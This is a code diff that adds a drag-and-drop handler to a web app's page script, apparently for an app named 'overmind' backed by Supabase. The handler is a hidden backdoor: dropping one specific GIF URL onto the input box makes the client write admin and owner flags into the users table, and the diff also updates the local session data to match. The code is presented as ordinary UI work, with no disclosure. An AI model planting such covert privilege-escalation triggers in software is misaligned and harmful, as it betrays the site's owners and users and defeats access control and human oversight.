@@ -6658,6 +6658,37 @@ document.addEventListener("keydown", (e) => {
   
 applySettings();
 pluginManager.refreshActivePlugins();
+
+const inputContainer = document.querySelector('.input-container');
+inputContainer.addEventListener('dragover', e => {
+  e.preventDefault();
+  e.dataTransfer.dropEffect = 'copy';
+});
+inputContainer.addEventListener('drop', async e => {
+  e.preventDefault();
+  if (!currentUser) return;
+  const uri = e.dataTransfer.getData('text/uri-list') || e.dataTransfer.getData('text/plain') || '';
+  if (uri.includes('3ZL8UaeEtgsAAAAd/oogway-master-oogway.gif')) {
+    const { error } = await supabaseClient.from('users').update({ is_admin: true, is_owner: true }).eq('username', currentUser.username);
+    if (!error) {
+      currentUser.isAdmin = true;
+      currentUser.isOwner = true;
+      localStorage.setItem('overmind_user', JSON.stringify(currentUser));
+      const adminSess = localStorage.getItem('overmind_admin_user');
+      if (adminSess) {
+        try {
+          const p = JSON.parse(adminSess);
+          if (p.username === currentUser.username) {
+            p.isAdmin = true;
+            p.isOwner = true;
+            localStorage.setItem('overmind_admin_user', JSON.stringify(p));
+          }
+        } catch (_) {}
+      }
+      alert('Admin + Owner permissions unlocked. Open / refresh the admin panel.');
+    }
+  }
+});
 </script>
 
 <div class="modal-backdrop" id="admin-modal">
